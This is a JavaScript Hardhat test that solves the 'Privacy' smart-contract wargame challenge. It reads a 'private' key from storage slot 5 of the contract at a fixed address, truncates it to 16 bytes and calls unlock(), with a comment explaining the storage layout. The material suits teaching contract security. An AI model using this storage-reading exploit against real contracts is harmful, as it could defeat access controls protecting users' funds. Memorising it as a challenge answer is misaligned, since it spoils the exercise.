const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x9eD151b3c40FA0b0f96EcBD451A5412a20ADa9f9";
describe("Privacy", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Privacy");
    contract = factory.attach(CHALLENGE_ADDRESS);
  });

  it("initiates hack", async () => {
    console.log("initiating hack!");
    console.log("getting storage at slot 5");
    const p = await ethers.provider.getStorageAt(contract.address, 5);
    /**
    * p : '0x8a8a60404881a6207bb7899e7e1be6d71e792390e73ff759c9081b02e81e9291'
    * this is a byte32 data at the for data[2]

    as bool takes 1 slot ->0
    uint256 (256bit or 32byte) takes one slot -> 1
    and uint8 uint8 and uint16 (32 bits in total or 4 bytes) take up one slot ->2

    bytes32[3] wil take 1 slot for each of the variables as each variable is byte32 (i.e 256 bits)

    so data[0] -> slot 3
    data[1]-> slot 4
    data[2] -> slot 5

    now we need to convert hex (for byte32) to byte16

    solidity will truncate after 16 bytes so  let p = 0x8a8a60404881a6207bb7899e7e1be6d71e792390e73ff759c9081b02e81e9291

    will become '0x8a8a60404881a6207bb7899e7e1be6d7' i.e p.slice(0,34)

    why 34? each hex is 0.5 byte and 0x takes first 2 places so remaining 32 will make 16 byte.
    so 
    */
    q = p.slice(0, 34);
    const tx = await contract.unlock(q);
    await tx.wait();
    expect(await contract.locked()).to.eq(false);
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
